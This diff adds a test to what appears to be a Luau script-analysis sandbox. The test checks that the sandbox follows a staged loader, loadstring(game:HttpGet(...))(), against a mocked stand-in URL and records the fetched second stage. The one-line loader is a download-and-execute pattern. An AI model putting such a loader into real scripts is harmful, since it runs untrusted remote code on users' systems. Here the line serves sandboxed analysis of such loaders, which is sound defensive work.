@@ -110,3 +110,10 @@ def test_vm_style_payload_yields_reconstruction_and_constants():
 def test_luau_surface_available():
     r = sandbox.run('print(typeof(game), table.find({5,6},6), math.clamp(9,0,3), #table.create(3,0), select("#",table.unpack({1,2})))')
     assert r.prints == ["Instance\t2\t3\t3\t2"]
+
+
+def test_httpget_chain_follows_fetched_stage():
+    src = 'loadstring(game:HttpGet("https://example.invalid/stage2.lua"))()'
+    r = sandbox.run(src, http={"https://example.invalid/stage2.lua": 'print("stage2 ran")'})
+    assert r.gets == ["https://example.invalid/stage2.lua"] and r.captures == ['print("stage2 ran")'] and r.prints == ["stage2 ran"]
+    assert sandbox.run(src).captures == [""]
